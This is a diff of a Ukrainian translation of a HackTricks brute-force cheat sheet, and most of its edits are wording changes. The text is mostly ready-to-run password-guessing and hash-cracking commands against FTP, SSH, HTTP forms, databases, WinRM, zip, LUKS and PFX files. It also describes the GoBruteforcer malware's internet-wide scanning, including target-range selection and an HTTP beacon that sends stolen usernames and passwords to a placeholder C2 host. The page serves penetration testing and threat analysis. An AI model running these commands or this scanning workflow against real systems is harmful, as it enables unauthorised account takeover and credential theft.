@@ -1,10 +1,8 @@
 # Brute Force - CheatSheet
 
-{{#include ../banners/hacktricks-training.md}}
-
 ## Облікові дані за замовчуванням
 
-**Пошукайте в Google** облікові дані за замовчуванням для технології, що використовується, або **скористайтеся цими посиланнями**:
+**Шукайте в Google** облікові дані за замовчуванням для технології, що використовується, або **скористайтеся цими посиланнями**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -21,7 +19,7 @@
 
 ## **Створення власних словників**
 
-Зберіть якомога більше інформації про ціль і створіть власний словник. Інструменти, які можуть допомогти:
+Зберіть якомога більше інформації про ціль і згенеруйте власний словник. Можуть допомогти такі інструменти:
 
 ### Crunch
 ```bash
@@ -34,7 +32,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Списки слів на основі вебсайту
+### Списки слів на основі вебсайтів
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -47,13 +45,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Генеруйте паролі на основі відомої вам інформації про жертву (імена, дати...).
+Генерує паролі на основі відомої вам інформації про жертву (імена, дати...).
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Інструмент для генерації wordlist, якому можна передати набір слів, отримавши можливість створити з них численні варіації та сформувати унікальний і оптимальний wordlist для конкретної цілі.
+Інструмент для створення wordlist, який дає змогу вказати набір слів і створювати численні варіації з цих слів, формуючи унікальний та ідеальний wordlist для використання щодо конкретної цілі.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +72,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlists
+### Списки слів
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,17 +85,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Workflow bruteforcer для всього Internet (уроки зі сканерів на Go)
+## Процес загальнодоступного bruteforcing в Інтернеті (уроки зі сканерів на Go)
 
-- Підтримуйте **пули worker'ів, налаштовані під архітектуру** (наприклад, приблизно 95 goroutines для `x86_64/arm64`, 85 для `i686`, 50 для малопотужних ARM) і перезапускайте їх щосекунди, щоб підтримувати **фіксовану concurrency**, при цьому кожен worker має обробляти рівно одну цільову IP-адресу перед завершенням роботи.<sup>[[1]](#references)</sup>
-- Генеруйте **випадкові публічні IPv4-адреси**, але відкидайте очевидно насичені honeypot або нерутовані діапазони: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, переважно cloud `/8` (`3/15/16/56`) і пов'язані з DoD `/8` (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Перевіряйте порт сервісу** з коротким timeout (~2s) перед спробою **cleartext login** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin через HTTP/80) і використовуйте **невеликий вбудований список credentials**, якщо отримання remote dictionary/C2 не вдається.
-- **Екcфільтруйте знайдені облікові дані** через невеликі HTTP GET beacon, наприклад `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (коди сервісів на кшталт `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), повторно використовуючи стандартний browser User-Agent для маскування.
-- **phpMyAdmin spray** може виконувати brute-force для десятків імовірних шляхів (~80+), використовуючи `GET /index.php?lang=en`, виявляти PMA-маркери (тема `pmahomme`/`phpmyadmin.css`/`navigation.php`) і аналізувати `codemirror.css?v=X.Y.Z`, щоб обрати спосіб auth: версії `<4.9` приймають GET-параметри `pma_username`/`pma_password`; версії `>=4.9` потребують POST із `server=1`, CSRF `token` і тими самими credentials.
+Наведені нижче особливості були помічені в процесі сканування malware GoBruteforcer; точні значення залежать від конкретного зразка.<sup>[[1]](#references)</sup>
 
-## Services
+- Підтримувати **пули worker'ів, оптимізовані для архітектури** (наприклад, 95 одночасних worker'ів на `x86_64/arm64`, 85 на `i686`, 35 на `armv5tel` і 50 за замовчуванням на інших архітектурах), щосекунди перевіряти активні worker'и та запускати заміни, коли їхня кількість нижча за цільову; кожен worker обробляє не більше однієї цільової IP-адреси перед завершенням роботи.
+- Генерувати **випадкові публічні IPv4-адреси**, але відкидати очевидно немаршрутизовані та вибрані оператором діапазони, яких слід уникати: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, насичені cloud `/8` (`3/15/16/56`) та пов'язані з DoD `/8` (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Перевіряти порт сервісу** з коротким timeout (~2 с) перед спробою **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin через HTTP/80) і переходити до **невеликого вбудованого списку облікових даних**, якщо отримання credentials з C2 завершується помилкою.
+- **Експортувати знайдені результати** через невеликі HTTP GET beacon'и, наприклад `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (коди сервісів на кшталт `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), повторно використовуючи спільний User-Agent браузера для маскування під звичайний трафік.
+- **Spray для phpMyAdmin** може виконувати bruteforce приблизно 80 ймовірних шляхів за допомогою `GET /index.php?lang=en`, виявляти маркери PMA (тема `pmahomme`/`phpmyadmin.css`/`navigation.php`) і аналізувати `codemirror.css?v=X.Y.Z` для вибору способу автентифікації: версії `<4.9` приймають GET-параметри `pma_username`/`pma_password`; версії `>=4.9` використовують POST із `server=1`, CSRF `token` і тими самими credentials.
 
-Упорядковано в алфавітному порядку за назвою сервісу.
+## Сервіси
+
+Впорядковано за алфавітом за назвою сервісу.
 
 ### AFP
 ```bash
@@ -149,7 +149,7 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### Загальний HTTP Brute Force
+### HTTP Generic Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -165,14 +165,14 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - POST-форма
+### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
 Для http**s** потрібно змінити "http-post-form" на "**https-post-form"**
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla або (D)rupal чи (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -196,9 +196,6 @@ nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/va
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
-
-#https://github.com/Sjord/jwtcrack
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
 
 #John
 john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
@@ -292,11 +289,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Щоб використовувати **oracle_login** із **patator**, потрібно **встановити**:
+Щоб використовувати **oracle_login** з **patator**, потрібно **встановити**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**версії 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** та **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -323,7 +320,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-Ви можете завантажити пакет `.deb` для встановлення з [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
+Ви можете завантажити пакет `.deb` для встановлення з [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/).
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -420,11 +417,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Слабкі SSH keys / передбачуваний PRNG у Debian
 
-Деякі системи мають відомі вразливості в seed випадкових чисел, що використовується для генерування криптографічних матеріалів. Це може призвести до різкого зменшення keyspace, який можна bruteforce за допомогою таких інструментів, як [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Також доступні попередньо згенеровані набори слабких ключів, наприклад [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Деякі системи мають відомі недоліки у випадковому seed, що використовується для генерації криптографічних матеріалів. Це може призвести до значного зменшення keyspace, який можна піддати brute-force за допомогою таких інструментів, як [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Також доступні попередньо згенеровані набори слабких keys, наприклад [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ та OpenMQ)
 
-Текстовий протокол STOMP — це широко використовуваний протокол обміну повідомленнями, який **забезпечує безперешкодний зв’язок і взаємодію з популярними сервісами message queueing**, такими як RabbitMQ, ActiveMQ, HornetQ і OpenMQ. Він забезпечує стандартизований та ефективний підхід до обміну повідомленнями й виконання різноманітних операцій із повідомленнями.
+Текстовий протокол STOMP — це широко використовуваний протокол обміну повідомленнями, який **забезпечує безперешкодну комунікацію та взаємодію з популярними сервісами черг повідомлень**, такими як RabbitMQ, ActiveMQ, HornetQ та OpenMQ. Він надає стандартизований і ефективний підхід до обміну повідомленнями та виконання різних операцій із повідомленнями.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -464,11 +461,11 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## Локально
 
-### Онлайн-бази для cracking
+### Онлайн-бази даних для cracking
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 і SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 з ESS/SSP або без них і з будь-яким значенням challenge)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Хеші, WPA2 captures і архіви MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 з ESS/SSP або без них, а також із будь-яким значенням challenge)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Хеші, WPA2 captures та архіви MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Хеші)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 - [https://gpuhash.me/](https://gpuhash.me) (Хеші та хеші файлів)
@@ -498,7 +495,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-Вам потрібно знати **plaintext** (або його частину) **файлу, що міститься всередині** зашифрованого zip. Ви можете перевірити **назви файлів і розмір файлів, що містяться всередині** зашифрованого zip, виконавши: **`7z l encrypted.zip`**\
+Вам потрібно знати **plaintext** (або частину plaintext) **файлу, що міститься всередині** encrypted zip. Ви можете перевірити **імена файлів і розмір файлів, що містяться всередині** encrypted zip, виконавши: **`7z l encrypted.zip`**\
 Завантажте [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) зі сторінки релізів.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -567,11 +564,11 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Образ Lucks
+### Образ LUKS
 
 #### Метод 1
 
-Встановлення: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Встановіть: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
@@ -587,7 +584,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Ще один tutorial з Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Ще один Luks BF tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -610,9 +607,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### Захищений паролем стовпець Open Office
 
-Якщо у вас є файл xlsx зі стовпцем, захищеним паролем, ви можете зняти цей захист:
+Якщо у вас є файл xlsx зі стовпцем, захищеним паролем, його можна розблокувати:
 
-- **Завантажте його на Google Drive**, і пароль буде автоматично видалено
+- **Завантажте його на google drive**, і пароль буде автоматично видалено
 - Щоб **видалити його** **вручну**:
 ```bash
 unzip file.xlsx
@@ -622,7 +619,7 @@ hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UV
 # Remove that line and rezip the file
 zip -r file.xls .
 ```
-### PFX Сертифікати
+### PFX-сертифікати
 ```bash
 # From https://github.com/Ridter/p12tool
 ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
@@ -647,7 +644,7 @@ hash-identifier
 
 ### **Інструменти генерації списків слів**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Розширений генератор keyboard-walk із налаштовуваними базовими символами, keymap і маршрутами.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Розширений генератор keyboard-walk із налаштовуваними базовими символами, розкладкою клавіатури та маршрутами.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -662,16 +659,16 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Атаки Hashcat
 
-- **Wordlist attack** (`-a 0`) з rules
+- **Wordlist attack** (`-a 0`) із rules
 
-**Hashcat** уже містить **папку з rules**, але [**тут можна знайти інші цікаві rules**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** уже містить **папку з rules**, але [**інші цікаві rules можна знайти тут**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** attack
 
-За допомогою hashcat можна **об’єднати 2 wordlist в 1**.\
-Якщо список 1 містив слово **"hello"**, а другий містив 2 рядки зі словами **"world"** і **"earth"**, буде згенеровано слова `helloworld` і `helloearth`.
+За допомогою hashcat можна **об'єднати 2 wordlist в 1**.\
+Якщо список 1 містить слово **"hello"**, а другий містить 2 рядки зі словами **"world"** і **"earth"**, буде згенеровано слова `helloworld` і `helloearth`.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -733,7 +730,7 @@ hashcat --example-hashes | grep -B1 -A2 "NTLM"
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Зламування хешів Windows
+Злам Windows-хешів
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
@@ -748,8 +745,7 @@ hashcat --example-hashes | grep -B1 -A2 "NTLM"
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
-## Посилання
+## References
 
-- [1] [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
-
+- [1] [Всередині GoBruteforcer: створені ШІ типові налаштування серверів, слабкі паролі та кампанії, зосереджені на криптовалютах](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 {{#include ../banners/hacktricks-training.md}}
